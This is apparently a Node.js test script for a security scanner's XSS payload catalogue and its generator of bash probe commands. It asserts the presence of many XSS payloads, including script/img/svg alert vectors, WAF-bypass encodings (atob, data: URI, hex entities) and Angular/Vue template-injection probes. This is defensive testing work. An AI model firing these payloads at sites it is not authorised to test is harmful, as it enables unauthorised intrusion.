// XSS payload library + webinput multi-vector generation tests. No network.
// Run: node scripts/test-xss.mjs
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { generatePayload, renderPayload, parsePayloadSpec, XSS_PAYLOADS, XSS_REFLECT_TESTS, XSS_CSTI, CSTI_PROBES } from '../src/services/payloads/templates.js';
import { buildWebInputCommand } from '../src/services/webinput/index.js';

let pass = 0, fail = 0;
const ok = (n, c, e = '') => { if (c) { pass++; console.log(`  ✅ ${n}`); } else { fail++; console.log(`  ❌ ${n} ${e}`); } };

console.log('\n[1] XSS payload catalogue (the famous set + extras)');
ok('>=17 payloads (image list + extras)', XSS_PAYLOADS.length >= 17);
const has = (p) => XSS_PAYLOADS.some((x) => x.p === p);
ok('The King <script>alert(1)</script>', has('<script>alert(1)</script>'));
ok('img onerror', has('<img src=x onerror=alert(1)>'));
ok('svg onload', has('<svg onload=alert(1)>'));
ok('case bypass <ScRiPt>', has('<ScRiPt>alert(1)</sCrIpt>'));
ok('base64 obfuscation eval(atob())', has("eval(atob('YWxlcnQoMSk='))"));
ok('details ontoggle', has('<details open ontoggle=alert(1)>'));
ok('every payload has a label + context', XSS_PAYLOADS.every((x) => x.label && x.ctx));

console.log('\n[2] generation + context filtering + parse');
ok('parse "xss" -> type xss', parsePayloadSpec('xss').type === 'xss');
ok('parse "cross-site" alias -> xss', parsePayloadSpec('cross-site').type === 'xss');
ok('parse "xss attr" -> context attr', parsePayloadSpec('xss attr').language === 'attr');
const all = generatePayload({ type: 'xss' });
ok('generate all -> full list', all.list.length === XSS_PAYLOADS.length && all.type === 'xss');
const attr = generatePayload({ type: 'xss', language: 'attr' });
ok('attr context filters to attr only', attr.list.length > 0 && attr.list.every((x) => x.ctx === 'attr'));
const waf = generatePayload({ type: 'xss', language: 'waf' });
ok('waf context filters to waf only', waf.list.length > 0 && waf.list.every((x) => x.ctx === 'waf'));
ok('unknown context falls back to all', generatePayload({ type: 'xss', language: 'zzz' }).list.length === XSS_PAYLOADS.length);
ok('code joins payloads by newline', all.code.split('\n').length === XSS_PAYLOADS.length);

console.log('\n[3] render');
const r = renderPayload(generatePayload({ type: 'xss', language: 'html' }));
ok('render lists label + payload', /svg onload|Modern/.test(r) && /`<svg onload=alert\(1\)>`/.test(r));
ok('render notes context', /html context/.test(r));
ok('render steers to webinput auto-test', /webinput/.test(r));

console.log('\n[4] webinput multi-vector reflected-XSS boost');
ok('>=6 reflect-test vectors', XSS_REFLECT_TESTS.length >= 6);
ok('every reflect-test has payload + sig + label', XSS_REFLECT_TESTS.every((t) => t.p && t.sig && t.label));
const cmd = buildWebInputCommand('https://acme.tld/search');
const _f = path.join(os.tmpdir(), `xsschk_${Math.random().toString(36).slice(2)}.sh`);
fs.writeFileSync(_f, cmd);
const _bash = spawnSync('bash', ['-n', _f], { encoding: 'utf8' });
fs.rmSync(_f, { force: true });
ok('generated command is valid bash', _bash.status === 0, _bash.stderr?.trim());
ok('all 6 vectors embedded in webinput scan', XSS_REFLECT_TESTS.every((t) => cmd.includes(t.label)));
ok('multi-vector loop present (xssfound guard)', /xssfound=0/.test(cmd) && (cmd.match(/xssfound" = 0/g) || []).length >= 6);
ok('marker-anchored sig check (low false-positive)', /\$MARK\.\{0,25\}/.test(cmd));
ok('encodes payloads for URL (svg onload)', cmd.includes(encodeURIComponent('<svg onload=alert(1)>')));

console.log('\n[5] PortSwigger cheat-sheet additions — no-interaction, WAF-bypass, CSTI');
const hasP = (p) => XSS_PAYLOADS.some((x) => x.p === p);
ok('no-interaction: audio onerror', hasP('<audio src/onerror=alert(1)>'));
ok('no-interaction: body onpageshow', hasP('<body onpageshow=alert(1)>'));
ok('no-interaction: onanimationstart', XSS_PAYLOADS.some((x) => x.ctx === 'noint' && /onanimationstart/.test(x.p)));
ok('WAF-bypass: atob base64 vector', XSS_PAYLOADS.some((x) => x.ctx === 'waf' && /atob`/.test(x.p)));
ok('WAF-bypass: data: URI script', XSS_PAYLOADS.some((x) => x.ctx === 'waf' && /data:text\/javascript;base64/.test(x.p)));
ok('WAF-bypass: hex-entity javascript:', XSS_PAYLOADS.some((x) => x.ctx === 'waf' && /&#x6a;/.test(x.p)));
ok('noint context filter works', generatePayload({ type: 'xss', language: 'noint' }).list.every((x) => x.ctx === 'noint'));
ok('waf context has >=8 encodings', generatePayload({ type: 'xss', language: 'waf' }).list.length >= 8);
// CSTI
ok('CSTI list present (Angular+Vue)', XSS_CSTI.length >= 6 && XSS_CSTI.some((x) => x.ctx === 'angular') && XSS_CSTI.some((x) => x.ctx === 'vue'));
ok('CSTI detection probe {{7*7}}', XSS_CSTI.some((x) => x.p === '{{7*7}}'));
ok('generate csti context', generatePayload({ type: 'xss', language: 'csti' }).list.length >= 6);
ok('generate vue-only context', generatePayload({ type: 'xss', language: 'vue' }).list.every((x) => x.ctx === 'vue' || x.ctx === 'detect'));
ok('CSTI_PROBES has {{7*7}}->49', CSTI_PROBES.some((t) => t.inject === '{{7*7}}' && t.sig === '49'));
// webinput now carries CSTI probes + extra XSS vectors
ok('webinput scan has CSTI loop', cmd.includes('cstifound=0'));
ok('webinput scan emits csti finding', /emit high csti/.test(cmd));
ok('webinput scan has >=11 XSS vectors', (cmd.match(/emit high xss-reflect/g) || []).length >= 11);
ok('new reflect vector: audio onerror', XSS_REFLECT_TESTS.some((t) => /audio/.test(t.label)));

console.log(`\n${fail === 0 ? '🎉 ALL PASS' : '💥 FAILURES'} — ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
